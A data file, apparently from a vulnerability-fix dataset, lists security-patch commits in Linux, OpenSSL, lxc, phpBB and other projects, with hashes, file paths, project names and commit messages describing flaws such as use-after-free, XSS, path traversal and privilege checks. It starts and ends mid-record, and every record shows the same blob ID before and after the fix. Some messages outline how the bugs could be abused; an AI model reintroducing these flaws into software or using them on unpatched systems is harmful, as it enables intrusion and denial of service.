<4>[196727.311344] Hardware name: Supermicro X9DRi-LN4+/X9DR3-LN4+/X9DRi-LN4+/X9DR3-LN4+, BIOS 3.0 07/05/2013 <4>[196727.311364] task: ffff885e6f069700 ti: ffff885e6f072000 task.ti: ffff885e6f072000 <4>[196727.311377] RIP: 0010:[<ffffffff815f8c7f>]  [<ffffffff815f8c7f>] ipv4_dst_destroy+0x4f/0x80 <4>[196727.311399] RSP: 0018:ffff885effd23a70  EFLAGS: 00010282 <4>[196727.311409] RAX: dead000000200200 RBX: ffff8854c398ecc0 RCX: 0000000000000040 <4>[196727.311423] RDX: dead000000100100 RSI: dead000000100100 RDI: dead000000200200 <4>[196727.311437] RBP: ffff885effd23a80 R08: ffffffff815fd9e0 R09: ffff885d5a590800 <4>[196727.311451] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000 <4>[196727.311464] R13: ffffffff81c8c280 R14: 0000000000000000 R15: ffff880e85ee16ce <4>[196727.311510] FS:  0000000000000000(0000) GS:ffff885effd20000(0000) knlGS:0000000000000000 <4>[196727.311554] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 <4>[196727.311581] CR2: 00007a46751eb000 CR3: 0000005e65688000 CR4: 00000000000407e0 <4>[196727.311625] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 <4>[196727.311669] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400 <4>[196727.311713] Stack: <4>[196727.311733]  ffff8854c398ecc0 ffff8854c398ecc0 ffff885effd23ab0 ffffffff815b7f42 <4>[196727.311784]  ffff88be6595bc00 ffff8854c398ecc0 0000000000000000 ffff8854c398ecc0 <4>[196727.311834]  ffff885effd23ad0 ffffffff815b86c6 ffff885d5a590800 ffff8816827821c0 <4>[196727.311885] Call Trace: <4>[196727.311907]  <IRQ> <4>[196727.311912]  [<ffffffff815b7f42>] dst_destroy+0x32/0xe0 <4>[196727.311959]  [<ffffffff815b86c6>] dst_release+0x56/0x80 <4>[196727.311986]  [<ffffffff81620bd5>] tcp_v4_do_rcv+0x2a5/0x4a0 <4>[196727.312013]  [<ffffffff81622b5a>] tcp_v4_rcv+0x7da/0x820 <4>[196727.312041]  [<ffffffff815fd9e0>] ? ip_rcv_finish+0x360/0x360 <4>[196727.312070]  [<ffffffff815de02d>] ? nf_hook_slow+0x7d/0x150 <4>[196727.312097]  [<ffffffff815fd9e0>] ? ip_rcv_finish+0x360/0x360 <4>[196727.312125]  [<ffffffff815fda92>] ip_local_deliver_finish+0xb2/0x230 <4>[196727.312154]  [<ffffffff815fdd9a>] ip_local_deliver+0x4a/0x90 <4>[196727.312183]  [<ffffffff815fd799>] ip_rcv_finish+0x119/0x360 <4>[196727.312212]  [<ffffffff815fe00b>] ip_rcv+0x22b/0x340 <4>[196727.312242]  [<ffffffffa0339680>] ? macvlan_broadcast+0x160/0x160 [macvlan] <4>[196727.312275]  [<ffffffff815b0c62>] __netif_receive_skb_core+0x512/0x640 <4>[196727.312308]  [<ffffffff811427fb>] ? kmem_cache_alloc+0x13b/0x150 <4>[196727.312338]  [<ffffffff815b0db1>] __netif_receive_skb+0x21/0x70 <4>[196727.312368]  [<ffffffff815b0fa1>] netif_receive_skb+0x31/0xa0 <4>[196727.312397]  [<ffffffff815b1ae8>] napi_gro_receive+0xe8/0x140 <4>[196727.312433]  [<ffffffffa00274f1>] ixgbe_poll+0x551/0x11f0 [ixgbe] <4>[196727.312463]  [<ffffffff815fe00b>] ? ip_rcv+0x22b/0x340 <4>[196727.312491]  [<ffffffff815b1691>] net_rx_action+0x111/0x210 <4>[196727.312521]  [<ffffffff815b0db1>] ? __netif_receive_skb+0x21/0x70 <4>[196727.312552]  [<ffffffff810519d0>] __do_softirq+0xd0/0x270 <4>[196727.312583]  [<ffffffff816cef3c>] call_softirq+0x1c/0x30 <4>[196727.312613]  [<ffffffff81004205>] do_softirq+0x55/0x90 <4>[196727.312640]  [<ffffffff81051c85>] irq_exit+0x55/0x60 <4>[196727.312668]  [<ffffffff816cf5c3>] do_IRQ+0x63/0xe0 <4>[196727.312696]  [<ffffffff816c5aaa>] common_interrupt+0x6a/0x6a <4>[196727.312722]  <EOI> <1>[196727.313071] RIP  [<ffffffff815f8c7f>] ipv4_dst_destroy+0x4f/0x80 <4>[196727.313100]  RSP <ffff885effd23a70> <4>[196727.313377] ---[ end trace 64b3f14fae0f2e29 ]--- <0>[196727.380908] Kernel panic - not syncing: Fatal exception in interrupt\n\nReported-by: Alexey Preobrazhensky <preobr@google.com> Reported-by: dormando <dormando@rydia.ne> Signed-off-by: Eric Dumazet <edumazet@google.com> Fixes: 8141ed9fcedb2 ("ipv4: Add a socket release callback for datagram sockets") Cc: Steffen Klassert <steffen.klassert@secunet.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    60a2362f769cf549dc466134efe71c8bf9fbaaba
File(s) In Commit: 
    drivers/regulator/core.c
Blob(s) In Commit: 
    47a455cfe04fb344409a1f48ac52a7c9450edad3
Blob(s) Before Fix: 
    47a455cfe04fb344409a1f48ac52a7c9450edad3
Projects:
    0-T-0_ps4-linux
Commit Message for 60a2362f769cf549dc466134efe71c8bf9fbaaba:
regulator: core: Fix regualtor_ena_gpio_free not to access pin after freeing\n\nAfter freeing pin from regulator_ena_gpio_free, loop can access the pin. So this patch fixes not to access pin after freeing.\n\nSigned-off-by: Seung-Woo Kim <sw0312.kim@samsung.com> Signed-off-by: Mark Brown <broonie@kernel.org>

======================================================================
Commit With Fix: 
    1421e0c584ae9120ca1b88098f13d6d2e90b83a3
File(s) In Commit: 
    ssl/s3_srvr.c
Blob(s) In Commit: 
    8550c1b7833e7ce5b2e585f614623a44ebdf2d2f
Blob(s) Before Fix: 
    8550c1b7833e7ce5b2e585f614623a44ebdf2d2f
Projects:
    0902710055_openssl
Commit Message for 1421e0c584ae9120ca1b88098f13d6d2e90b83a3:
Unauthenticated DH client certificate fix.\n\nFix to prevent use of DH client certificates without sending certificate verify message.\n\nIf we've used a client certificate to generate the premaster secret ssl3_get_client_key_exchange returns 2 and ssl3_get_cert_verify is never called.\n\nWe can only skip the certificate verify message in ssl3_get_cert_verify if the client didn't send a certificate.\n\nThanks to Karthikeyan Bhargavan for reporting this issue. CVE-2015-0205 Reviewed-by: Matt Caswell <matt@openssl.org>

======================================================================
Commit With Fix: 
    103b171d8fc282ef435f8de9afbf7782e312961f
File(s) In Commit: 
    ssl/d1_pkt.c
Blob(s) In Commit: 
    a8a06b439bad3bc0d190a1de9aabb5ab5ac59853
Blob(s) Before Fix: 
    a8a06b439bad3bc0d190a1de9aabb5ab5ac59853
Projects:
    0902710055_openssl
Commit Message for 103b171d8fc282ef435f8de9afbf7782e312961f:
A memory leak can occur in dtls1_buffer_record if either of the calls to ssl3_setup_buffers or pqueue_insert fail. The former will fail if there is a malloc failure, whilst the latter will fail if attempting to add a duplicate record to the queue. This should never happen because duplicate records should be detected and dropped before any attempt to add them to the queue. Unfortunately records that arrive that are for the next epoch are not being recorded correctly, and therefore replays are not being detected. Additionally, these "should not happen" failures that can occur in dtls1_buffer_record are not being treated as fatal and therefore an attacker could exploit this by sending repeated replay records for the next epoch, eventually causing a DoS through memory exhaustion.\n\nThanks to Chris Mueller for reporting this issue and providing initial analysis and a patch. Further analysis and the final patch was performed by Matt Caswell from the OpenSSL development team.\n\nCVE-2015-0206\n\nReviewed-by: Dr Stephen Henson <steve@openssl.org>

======================================================================
Commit With Fix: 
    f3747379accba8e95d70cec0eae0582c8c182050
File(s) In Commit: 
    arch/x86/kvm/emulate.c
Blob(s) In Commit: 
    de12c1d379f16899645d96a2c3fd75663919c86d
Blob(s) Before Fix: 
    de12c1d379f16899645d96a2c3fd75663919c86d
Projects:
    0-T-0_ps4-linux
Commit Message for f3747379accba8e95d70cec0eae0582c8c182050:
KVM: x86: SYSENTER emulation is broken\n\nSYSENTER emulation is broken in several ways: 1. It misses the case of 16-bit code segments completely (CVE-2015-0239). 2. MSR_IA32_SYSENTER_CS is checked in 64-bit mode incorrectly (bits 0 and 1 can    still be set without causing #GP). 3. MSR_IA32_SYSENTER_EIP and MSR_IA32_SYSENTER_ESP are not masked in    legacy-mode. 4. There is some unneeded code.\n\nFix it.\n\nCc: stable@vger.linux.org Signed-off-by: Nadav Amit <namit@cs.technion.ac.il> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    0f2af21aae11972fa924374ddcf52e88347cf5a8
File(s) In Commit: 
    fs/ext4/extents.c
Blob(s) In Commit: 
    3cc17aacc4c7d01fc3816a217654ec5d8706094e
Blob(s) Before Fix: 
    3cc17aacc4c7d01fc3816a217654ec5d8706094e
Projects:
    0-T-0_ps4-linux
Commit Message for 0f2af21aae11972fa924374ddcf52e88347cf5a8:
ext4: allocate entire range in zero range\n\nCurrently there is a bug in zero range code which causes zero range calls to only allocate block aligned portion of the range, while ignoring the rest in some cases.\n\nIn some cases, namely if the end of the range is past i_size, we do attempt to preallocate the last nonaligned block. However this might cause kernel to BUG() in some carefully designed zero range requests on setups where page size > block size.\n\nFix this problem by first preallocating the entire range, including the nonaligned edges and converting the written extents to unwritten in the next step. This approach will also give us the advantage of having the range to be as linearly contiguous as possible.\n\nSigned-off-by: Lukas Czerner <lczerner@redhat.com> Signed-off-by: Theodore Ts'o <tytso@mit.edu>

======================================================================
Commit With Fix: 
    66ab38918c911bcff025562cf06237d7fedaba0c
File(s) In Commit: 
    src/unix/process.c
Blob(s) In Commit: 
    1efd588b86ef8fcff0f75a1a999c104f2288cadc
Blob(s) Before Fix: 
    1efd588b86ef8fcff0f75a1a999c104f2288cadc
Projects:
    0-wiz-0_libuv
Commit Message for 66ab38918c911bcff025562cf06237d7fedaba0c:
unix: call setgoups before calling setuid/setgid\n\nPartial fix for #1093

======================================================================
Commit With Fix: 
    474a3db19498765f0118ba3dbc0b1cc90b0097fc
File(s) In Commit: 
    src/backend/bs_srcserver
Blob(s) In Commit: 
    223611c1bc5d818532f5cd8f94a017308d5127ab
Blob(s) Before Fix: 
    223611c1bc5d818532f5cd8f94a017308d5127ab
Projects:
    Abdelhamidhenni_open-build-service
Commit Message for 474a3db19498765f0118ba3dbc0b1cc90b0097fc:
[backend] sanity check the result of the external patch command\n\nSimple files only, please.

======================================================================
Commit With Fix: 
    4cfed6b0a625593fb43876f04badc4dd99799d86
File(s) In Commit: 
    src/daemon/Greeter.cpp
Blob(s) In Commit: 
    8c936b7d5ebfc6f76e420139459c8667d40e7d0a
Blob(s) Before Fix: 
    8c936b7d5ebfc6f76e420139459c8667d40e7d0a
Projects:
    AOSC-Dev_sddm
Commit Message for 4cfed6b0a625593fb43876f04badc4dd99799d86:
Disable greeters from loading KDE's debug hander\n\nSome themes may use KDE components which will automatically load KDE's crash handler.\n\nIf the greeter were to then somehow crash, that would leave a crash handler allowing other actions, albeit as the locked down SDDM user.\n\nOnly SDDM users using the breeze theme from plasma-workspace are affected. Safest and simplest fix is to handle this inside SDDM disabling kcrash via an environment variable for all future themes that may use these libraries.\n\nCVE-2015-0856

======================================================================
Commit With Fix: 
    1bc272874a86eaab99dccd00b29177423fd83877
File(s) In Commit: 
    classes/adminpage.inc.php
Blob(s) In Commit: 
    ee99b866c5891bcd9a52c3e985e16375a90c3334
Blob(s) Before Fix: 
    ee99b866c5891bcd9a52c3e985e16375a90c3334
Projects:
    mylex_saurus
Commit Message for 1bc272874a86eaab99dccd00b29177423fd83877:
Fix stored and reflected XSS vulnerabilities\n\nas described in VN: JVN#18387086 / TN: JPCERT#95011159 advisory.

======================================================================
Commit With Fix: 
    7de61b4c6244af9ff8e75a2c92a570f3b075309c
File(s) In Commit: 
    cas-server-support-ldap/src/main/java/org/jasig/cas/util/LdapUtils.java
Blob(s) In Commit: 
    e90bbaaa9d6d0730c2eb30277eda5c67c5f8a98c
Blob(s) Before Fix: 
    e90bbaaa9d6d0730c2eb30277eda5c67c5f8a98c
Projects:
    08guye_cas
Commit Message for 7de61b4c6244af9ff8e75a2c92a570f3b075309c:
Merge pull request #411 from serac/CAS-1429-ldap-filter-encoding\n\nCAS-1429 Escape inputs into LDAP filter expressions.

======================================================================
Commit With Fix: 
    fdad1406b3ec809f4954ff7cdf9e99eb18c2458f
File(s) In Commit: 
    pigz.c
Blob(s) In Commit: 
    38c0d4fec22f33537cc3b26a5e13946a3514c4f1
Blob(s) Before Fix: 
    38c0d4fec22f33537cc3b26a5e13946a3514c4f1
Projects:
    AOKP_external_pigz
Commit Message for fdad1406b3ec809f4954ff7cdf9e99eb18c2458f:
When decompressing with -N or -NT, strip any path from header name.\n\nThis uses the path of the compressed file combined with the name from the header as the name of the decompressed output file.  Any path information in the header name is stripped.  This avoids a possible vulnerability where absolute or descending paths are put in the gzip header.

======================================================================
Commit With Fix: 
    ca4da5dd1f99fe9c59f1709fb43e818b18ad20e0
File(s) In Commit: 
    security/keys/keyring.c
Blob(s) In Commit: 
    d33437007ad229313a5ef483826e427a74350876
Blob(s) Before Fix: 
    d33437007ad229313a5ef483826e427a74350876
Projects:
    0-T-0_ps4-linux
Commit Message for ca4da5dd1f99fe9c59f1709fb43e818b18ad20e0:
KEYS: ensure we free the assoc array edit if edit is valid\n\n__key_link_end is not freeing the associated array edit structure and this leads to a 512 byte memory leak each time an identical existing key is added with add_key().\n\nThe reason the add_key() system call returns okay is that key_create_or_update() calls __key_link_begin() before checking to see whether it can update a key directly rather than adding/replacing - which it turns out it can.  Thus __key_link() is not called through __key_instantiate_and_link() and __key_link_end() must cancel the edit.\n\nCVE-2015-1333\n\nSigned-off-by: Colin Ian King <colin.king@canonical.com> Signed-off-by: David Howells <dhowells@redhat.com> Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    5c3fcae78b63ac9dd56e36075903921bd9461f9e
File(s) In Commit: 
    src/lxc/attach.c
Blob(s) In Commit: 
    436ae7a56a9e1c031737e599620733d09b3cc3ce
Blob(s) Before Fix: 
    436ae7a56a9e1c031737e599620733d09b3cc3ce
Projects:
    0x0916_lxc
Commit Message for 5c3fcae78b63ac9dd56e36075903921bd9461f9e:
CVE-2015-1334: Don't use the container's /proc during attach\n\nA user could otherwise over-mount /proc and prevent the apparmor profile or selinux label from being written which combined with a modified /bin/sh or other commonly used binary would lead to unconfined code execution.\n\nReported-by: Roman Fiedler Signed-off-by: Stéphane Graber <stgraber@ubuntu.com>

======================================================================
Commit With Fix: 
    2c5816b4beccc8ba709144539f6fdd764f8fa49c
File(s) In Commit: 
    fs/fuse/cuse.c
Blob(s) In Commit: 
    8e3ee1936c7e38ba381b33c26b2f1847422a613f
Blob(s) Before Fix: 
    8e3ee1936c7e38ba381b33c26b2f1847422a613f
Projects:
    0-T-0_ps4-linux
Commit Message for 2c5816b4beccc8ba709144539f6fdd764f8fa49c:
cuse: fix memory leak\n\nThe problem is that fuse_dev_alloc() acquires an extra reference to cc.fc, and the original ref count is never dropped.\n\nReported-by: Colin Ian King <colin.king@canonical.com> Signed-off-by: Miklos Szeredi <miklos@szeredi.hu> Fixes: cc080e9e9be1 ("fuse: introduce per-instance fuse_dev structure") Cc: <stable@vger.kernel.org> # v4.2+

======================================================================
Commit With Fix: 
    8ee2a503e102b1a43ec4d83113dc275ab20a869a
File(s) In Commit: 
    lxcfs.c
Blob(s) In Commit: 
    5eb63c8e1777c695d71afbdec2990f1c8b257f89
Blob(s) Before Fix: 
    5eb63c8e1777c695d71afbdec2990f1c8b257f89
Projects:
    893751156_lxcfs
Commit Message for 8ee2a503e102b1a43ec4d83113dc275ab20a869a:
Implement privilege check when moving tasks\n\nWhen writing pids to a tasks file in lxcfs, lxcfs was checking for privilege over the tasks file but not over the pid being moved.  Since the cgm_movepid request is done as root on the host, not with the requestor's credentials, we must copy the check which cgmanager was doing to ensure that the requesting task is allowed to change the victim task's cgroup membership.\n\nThis is CVE-2015-1344 https://bugs.launchpad.net/ubuntu/+source/lxcfs/+bug/1512854\n\nSigned-off-by: Serge Hallyn <serge.hallyn@ubuntu.com>

======================================================================
Commit With Fix: 
    b38b3ca7235002137cc9ff74b3c24a4a78c9c2d1
File(s) In Commit: 
    client.inc.php
Blob(s) In Commit: 
    64877cc46b004f2f9ef3d3a2c4c69a24b81f8b1d
Blob(s) Before Fix: 
    64877cc46b004f2f9ef3d3a2c4c69a24b81f8b1d
Projects:
    01remi_osTicket
Commit Message for b38b3ca7235002137cc9ff74b3c24a4a78c9c2d1:
xss: Fix possible vuln setting client lang pref

======================================================================
Commit With Fix: 
    600ddd6825543962fb807884169e57b580dba208
File(s) In Commit: 
    net/sctp/associola.c
Blob(s) In Commit: 
    26d06dbcc1c8e137798be5071848990fe00a7fe6
Blob(s) Before Fix: 
    26d06dbcc1c8e137798be5071848990fe00a7fe6
Projects:
    0-T-0_ps4-linux
Commit Message for 600ddd6825543962fb807884169e57b580dba208:
net: sctp: fix slab corruption from use after free on INIT collisions\n\nWhen hitting an INIT collision case during the 4WHS with AUTH enabled, as already described in detail in commit 1be9a950c646 ("net: sctp: inherit auth_capable on INIT collisions"), it can happen that we occasionally still remotely trigger the following panic on server side which seems to have been uncovered after the fix from commit 1be9a950c646 ...\n\n[  533.876389] BUG: unable to handle kernel paging request at 00000000ffffffff [  533.913657] IP: [<ffffffff811ac385>] __kmalloc+0x95/0x230 [  533.940559] PGD 5030f2067 PUD 0 [  533.957104] Oops: 0000 [#1] SMP [  533.974283] Modules linked in: sctp mlx4_en [...] [  534.939704] Call Trace: [  534.951833]  [<ffffffff81294e30>] ? crypto_init_shash_ops+0x60/0xf0 [  534.984213]  [<ffffffff81294e30>] crypto_init_shash_ops+0x60/0xf0 [  535.015025]  [<ffffffff8128c8ed>] __crypto_alloc_tfm+0x6d/0x170 [  535.045661]  [<ffffffff8128d12c>] crypto_alloc_base+0x4c/0xb0 [  535.074593]  [<ffffffff8160bd42>] ? _raw_spin_lock_bh+0x12/0x50 [  535.105239]  [<ffffffffa0418c11>] sctp_inet_listen+0x161/0x1e0 [sctp] [  535.138606]  [<ffffffff814e43bd>] SyS_listen+0x9d/0xb0 [  535.166848]  [<ffffffff816149a9>] system_call_fastpath+0x16/0x1b\n\n... or depending on the the application, for example this one:\n\n[ 1370.026490] BUG: unable to handle kernel paging request at 00000000ffffffff [ 1370.026506] IP: [<ffffffff811ab455>] kmem_cache_alloc+0x75/0x1d0 [ 1370.054568] PGD 633c94067 PUD 0 [ 1370.070446] Oops: 0000 [#1] SMP [ 1370.085010] Modules linked in: sctp kvm_amd kvm [...] [ 1370.963431] Call Trace: [ 1370.974632]  [<ffffffff8120f7cf>] ? SyS_epoll_ctl+0x53f/0x960 [ 1371.000863]  [<ffffffff8120f7cf>] SyS_epoll_ctl+0x53f/0x960 [ 1371.027154]  [<ffffffff812100d3>] ? anon_inode_getfile+0xd3/0x170 [ 1371.054679]  [<ffffffff811e3d67>] ? __alloc_fd+0xa7/0x130 [ 1371.080183]  [<ffffffff816149a9>] system_call_fastpath+0x16/0x1b\n\nWith slab debugging enabled, we can see that the poison has been overwritten:\n\n[  669.826368] BUG kmalloc-128 (Tainted: G        W     ): Poison overwritten [  669.826385] INFO: 0xffff880228b32e50-0xffff880228b32e50. First byte 0x6a instead of 0x6b [  669.826414] INFO: Allocated in sctp_auth_create_key+0x23/0x50 [sctp] age=3 cpu=0 pid=18494 [  669.826424]  __slab_alloc+0x4bf/0x566 [  669.826433]  __kmalloc+0x280/0x310 [  669.826453]  sctp_auth_create_key+0x23/0x50 [sctp] [  669.826471]  sctp_auth_asoc_create_secret+0xcb/0x1e0 [sctp] [  669.826488]  sctp_auth_asoc_init_active_key+0x68/0xa0 [sctp] [  669.826505]  sctp_do_sm+0x29d/0x17c0 [sctp] [...] [  669.826629] INFO: Freed in kzfree+0x31/0x40 age=1 cpu=0 pid=18494 [  669.826635]  __slab_free+0x39/0x2a8 [  669.826643]  kfree+0x1d6/0x230 [  669.826650]  kzfree+0x31/0x40 [  669.826666]  sctp_auth_key_put+0x19/0x20 [sctp] [  669.826681]  sctp_assoc_update+0x1ee/0x2d0 [sctp] [  669.826695]  sctp_do_sm+0x674/0x17c0 [sctp]\n\nSince this only triggers in some collision-cases with AUTH, the problem at heart is that sctp_auth_key_put() on asoc->asoc_shared_key is called twice when having refcnt 1, once directly in sctp_assoc_update() and yet again from within sctp_auth_asoc_init_active_key() via sctp_assoc_update() on the already kzfree'd memory, which is also consistent with the observation of the poison decrease from 0x6b to 0x6a (note: the overwrite is detected at a later point in time when poison is checked on new allocation).\n\nReference counting of auth keys revisited:\n\nShared keys for AUTH chunks are being stored in endpoints and associations in endpoint_shared_keys list. On endpoint creation, a null key is being added  on association creation, all endpoint shared keys are being cached and thus cloned over to the association. struct sctp_shared_key only holds a pointer to the actual key bytes, that is, struct sctp_auth_bytes which keeps track of users internally through refcounting. Naturally, on assoc or enpoint destruction, sctp_shared_key are being destroyed directly and the reference on sctp_auth_bytes dropped.\n\nUser space can add keys to either list via setsockopt(2) through struct sctp_authkey and by passing that to sctp_auth_set_key() which replaces or adds a new auth key. There, sctp_auth_create_key() creates a new sctp_auth_bytes with refcount 1 and in case of replacement drops the reference on the old sctp_auth_bytes. A key can be set active from user space through setsockopt() on the id via sctp_auth_set_active_key(), which iterates through either endpoint_shared_keys and in case of an assoc, invokes (one of various places) sctp_auth_asoc_init_active_key().\n\nsctp_auth_asoc_init_active_key() computes the actual secret from local's and peer's random, hmac and shared key parameters and returns a new key directly as sctp_auth_bytes, that is asoc->asoc_shared_key, plus drops the reference if there was a previous one. The secret, which where we eventually double drop the ref comes from sctp_auth_asoc_set_secret() with intitial refcount of 1, which also stays unchanged eventually in sctp_assoc_update(). This key is later being used for crypto layer to set the key for the hash in crypto_hash_setkey() from sctp_auth_calculate_hmac().\n\nTo close the loop: asoc->asoc_shared_key is freshly allocated secret material and independant of the sctp_shared_key management keeping track of only shared keys in endpoints and assocs. Hence, also commit 4184b2a79a76 ("net: sctp: fix memory leak in auth key management") is independant of this bug here since it concerns a different layer (though same structures being used eventually). asoc->asoc_shared_key is reference dropped correctly on assoc destruction in sctp_association_free() and when active keys are being replaced in sctp_auth_asoc_init_active_key(), it always has a refcount of 1. Hence, it's freed prematurely in sctp_assoc_update(). Simple fix is to remove that sctp_auth_key_put() from there which fixes these panics.\n\nFixes: 730fc3d05cd4 ("[SCTP]: Implete SCTP-AUTH parameter processing") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    23069a13e203985ab124d1139e8de74b12778449
File(s) In Commit: 
    phpBB/includes/ucp/ucp_pm_options.php
Blob(s) In Commit: 
    1d5c0ecce38535202b153b861362ae06ddccc04f
Blob(s) Before Fix: 
    1d5c0ecce38535202b153b861362ae06ddccc04f
Projects:
    007durgesh219_phpbb
Commit Message for 23069a13e203985ab124d1139e8de74b12778449:
[ticket/13526] Correctly validate the ucp_pm_options form key.\n\nPHPBB3-13526

======================================================================
Commit With Fix: 
    c93bc100ec93fc78940fbdca9b6b009101858309
File(s) In Commit: 
    index.php
Blob(s) In Commit: 
    09ae3db855968df278fafc870a6d535d73d89292
Blob(s) Before Fix: 
    09ae3db855968df278fafc870a6d535d73d89292
Projects:
    nean_pragyan
Commit Message for c93bc100ec93fc78940fbdca9b6b009101858309:
Update index.php

======================================================================
Commit With Fix: 
    a2f18db0c68fec96631c10cad9384c196e9008ac
File(s) In Commit: 
    net/netfilter/nf_tables_api.c
Blob(s) In Commit: 
    3b3ddb4fb9ee122a5b6d3a39450be38a64d6f614
Blob(s) Before Fix: 
    3b3ddb4fb9ee122a5b6d3a39450be38a64d6f614
Projects:
    0-T-0_ps4-linux
Commit Message for a2f18db0c68fec96631c10cad9384c196e9008ac:
netfilter: nf_tables: fix flush ruleset chain dependencies\n\nJumping between chains doesn't mix well with flush ruleset. Rules from a different chain and set elements may still refer to us.\n\n[  353.373791] ------------[ cut here ]------------ [  353.373845] kernel BUG at net/netfilter/nf_tables_api.c:1159! [  353.373896] invalid opcode: 0000 [#1] SMP [  353.373942] Modules linked in: intel_powerclamp uas iwldvm iwlwifi [  353.374017] CPU: 0 PID: 6445 Comm: 31c3.nft Not tainted 3.18.0 #98 [  353.374069] Hardware name: LENOVO 5129CTO/5129CTO, BIOS 6QET47WW (1.17 ) 07/14/2010 [...] [  353.375018] Call Trace: [  353.375046]  [<ffffffff81964c31>] ? nf_tables_commit+0x381/0x540 [  353.375101]  [<ffffffff81949118>] nfnetlink_rcv+0x3d8/0x4b0 [  353.375150]  [<ffffffff81943fc5>] netlink_unicast+0x105/0x1a0 [  353.375200]  [<ffffffff8194438e>] netlink_sendmsg+0x32e/0x790 [  353.375253]  [<ffffffff818f398e>] sock_sendmsg+0x8e/0xc0 [  353.375300]  [<ffffffff818f36b9>] ? move_addr_to_kernel.part.20+0x19/0x70 [  353.375357]  [<ffffffff818f44f9>] ? move_addr_to_kernel+0x19/0x30 [  353.375410]  [<ffffffff819016d2>] ? verify_iovec+0x42/0xd0 [  353.375459]  [<ffffffff818f3e10>] ___sys_sendmsg+0x3f0/0x400 [  353.375510]  [<ffffffff810615fa>] ? native_sched_clock+0x2a/0x90 [  353.375563]  [<ffffffff81176697>] ? acct_account_cputime+0x17/0x20 [  353.375616]  [<ffffffff8110dc78>] ? account_user_time+0x88/0xa0 [  353.375667]  [<ffffffff818f4bbd>] __sys_sendmsg+0x3d/0x80 [  353.375719]  [<ffffffff81b184f4>] ? int_check_syscall_exit_work+0x34/0x3d [  353.375776]  [<ffffffff818f4c0d>] SyS_sendmsg+0xd/0x20 [  353.375823]  [<ffffffff81b1826d>] system_call_fastpath+0x16/0x1b\n\nRelease objects in this order: rules -> sets -> chains -> tables, to make sure no references to chains are held anymore.\n\nReported-by: Asbjoern Sloth Toennesen <asbjorn@asbjorn.biz> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    4924b37ee01f71ae19c94a8934b80eeb2f677932
File(s) In Commit: 
    crypto/bn/bn_gf2m.c
Blob(s) In Commit: 
    cd137c36496f2322e4e4e4e2df12a72e09356bf9
Blob(s) Before Fix: 
    cd137c36496f2322e4e4e4e2df12a72e09356bf9
Projects:
    0902710055_openssl
Commit Message for 4924b37ee01f71ae19c94a8934b80eeb2f677932:
bn/bn_gf2m.c: avoid infinite loop wich malformed ECParamters.\n\nCVE-2015-1788\n\nReviewed-by: Matt Caswell <matt@openssl.org>

======================================================================
Commit With Fix: 
    f48b83b4fb7d6689584cf25f61ca63a4891f5b11
File(s) In Commit: 
    crypto/x509/x509_vfy.c
Blob(s) In Commit: 
    a920ea70b1500a59a355a5e52cdaad48fd40fa25
Blob(s) Before Fix: 
    a920ea70b1500a59a355a5e52cdaad48fd40fa25
Projects:
    0902710055_openssl
Commit Message for f48b83b4fb7d6689584cf25f61ca63a4891f5b11:
Fix length checks in X509_cmp_time to avoid out-of-bounds reads.\n\nAlso tighten X509_cmp_time to reject more than three fractional seconds in the time  and to reject trailing garbage after the offset.\n\nCVE-2015-1789\n\nReviewed-by: Viktor Dukhovni <viktor@openssl.org> Reviewed-by: Richard Levitte <levitte@openssl.org>

======================================================================
Commit With Fix: 
    59302b600e8d5b77ef144e447bb046fd7ab72686
File(s) In Commit: 
    crypto/pkcs7/pk7_doit.c
Blob(s) In Commit: 
    cc2f3be5543e3d5395efae6bb28115beb3061e72
Blob(s) Before Fix: 
    cc2f3be5543e3d5395efae6bb28115beb3061e72
Projects:
    0902710055_openssl
Commit Message for 59302b600e8d5b77ef144e447bb046fd7ab72686:
PKCS#7: Fix NULL dereference with missing EncryptedContent.\n\nCVE-2015-1790\n\nReviewed-by: Rich Salz <rsalz@openssl.org>

======================================================================
Commit With Fix: 
    cd30f03ac5bf2962f44bd02ae8d88245dff2f12c
File(s) In Commit: 
    crypto/cms/cms_smime.c
Blob(s) In Commit: 
    8f1aa38ccc5b3bd56ab755ba72f8084fa980320d
Blob(s) Before Fix: 
    8f1aa38ccc5b3bd56ab755ba72f8084fa980320d
Projects:
    0902710055_openssl
Commit Message for cd30f03ac5bf2962f44bd02ae8d88245dff2f12c:
Canonicalise input in CMS_verify.\n\nIf content is detached and not binary mode translate the input to CRLF format. Before this change the input was verified verbatim which lead to a discrepancy between sign and verify.

======================================================================
Commit With Fix: 
    e11298d7155e9982749483ca5538e46090caef9c
File(s) In Commit: 
    salt/modules/serverdensity_device.py
Blob(s) In Commit: 
    b8f577f701059ab3db0cf1396750f91f4dc1645b
Blob(s) Before Fix: 
    b8f577f701059ab3db0cf1396750f91f4dc1645b
Projects:
    0decimal0_salt
Commit Message for e11298d7155e9982749483ca5538e46090caef9c:
Move install.sh to cachedir for serverdensity_device

======================================================================
Commit With Fix: 
    6b8d9117ccb4f81b1244aafa7bc70ef8fa45fc49
File(s) In Commit: 
    net/llc/sysctl_net_llc.c
Blob(s) In Commit: 
    799bafc2af39ea191e3753c88c3f921e44a77162
Blob(s) Before Fix: 
    799bafc2af39ea191e3753c88c3f921e44a77162
Projects:
    0-T-0_ps4-linux
Commit Message for 6b8d9117ccb4f81b1244aafa7bc70ef8fa45fc49:
net: llc: use correct size for sysctl timeout entries\n\nThe timeout entries are sizeof(int) rather than sizeof(long), which means that when they were getting read we'd also leak kernel memory to userspace along with the timeout values.\n\nSigned-off-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    db27ebb111e9f69efece08e4cb6a34ff980f8896
File(s) In Commit: 
    net/rds/sysctl.c
Blob(s) In Commit: 
